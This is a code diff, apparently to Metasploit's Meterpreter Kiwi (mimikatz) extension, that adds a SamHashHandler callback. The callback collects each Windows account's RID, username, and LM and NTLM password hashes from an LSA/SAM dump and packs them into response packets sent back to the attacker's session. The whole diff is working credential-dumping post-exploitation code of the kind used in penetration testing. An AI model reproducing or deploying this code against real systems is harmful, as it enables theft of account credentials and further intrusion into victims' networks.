@@ -354,6 +354,50 @@ VOID SecretHandler(LPVOID lpContext, wchar_t* lpwSecretName, wchar_t* lpwService
 	packet_add_tlv_group(response, TLV_TYPE_KIWI_LSA_SECRET, entries, dwCount);
 }
 
+VOID SamHashHandler(LPVOID lpContext, DWORD dwRid, wchar_t* lpwUser, DWORD dwUserLength, BOOL hasLmHash, BYTE lmHash[LM_NTLM_HASH_LENGTH], BOOL hasNtlmHash, BYTE ntlmHash[LM_NTLM_HASH_LENGTH])
+{
+	Tlv entries[4];
+	DWORD dwCount = 0;
+	Packet *response = (Packet*)lpContext;
+	dprintf("[KIWI SAM] HERE!");
+
+	if (hasLmHash || hasNtlmHash)
+	{
+		dprintf("[KIWI SAM] Adding %S rid %u (%x)", lpwUser, dwRid, dwRid);
+
+		dwRid = htonl(dwRid);
+		entries[dwCount].header.type = TLV_TYPE_KIWI_LSA_SAM_RID;
+		entries[dwCount].header.length = sizeof(DWORD);
+		entries[dwCount].buffer = (PUCHAR)&dwRid;
+		++dwCount;
+
+		packet_add_tlv_wstring_entry(&entries[dwCount++], TLV_TYPE_KIWI_LSA_SAM_USER, lpwUser, dwUserLength);
+
+		if (hasLmHash)
+		{
+			entries[dwCount].header.type = TLV_TYPE_KIWI_LSA_SAM_LMHASH;
+			entries[dwCount].header.length = LM_NTLM_HASH_LENGTH;
+			entries[dwCount].buffer = (PUCHAR)lmHash;
+			++dwCount;
+		}
+
+		if (hasNtlmHash)
+		{
+			entries[dwCount].header.type = TLV_TYPE_KIWI_LSA_SAM_NTLMHASH;
+			entries[dwCount].header.length = LM_NTLM_HASH_LENGTH;
+			entries[dwCount].buffer = (PUCHAR)ntlmHash;
+			++dwCount;
+
+		}
+
+		packet_add_tlv_group(response, TLV_TYPE_KIWI_LSA_SAM, entries, dwCount);
+	}
+	else
+	{
+		dprintf("[KIWI SAM] Ignoring %S, no hashes given");
+	}
+}
+
 DWORD mimikatz_lsa_dump_secrets(Packet* response)
 {
 	LSA_CALLBACK_CTX callbackCtx;
@@ -369,6 +413,7 @@ DWORD mimikatz_lsa_dump_secrets(Packet* response)
 	callbackCtx.pNt6KeyHandler = Nt6KeyHandler;
 	callbackCtx.pNt5KeyHandler = Nt5KeyHandler;
 	callbackCtx.pSecretHandler = SecretHandler;
+	callbackCtx.pSamHashHandler = SamHashHandler;
 
 	return kuhl_m_lsadump_full(&callbackCtx);
 }
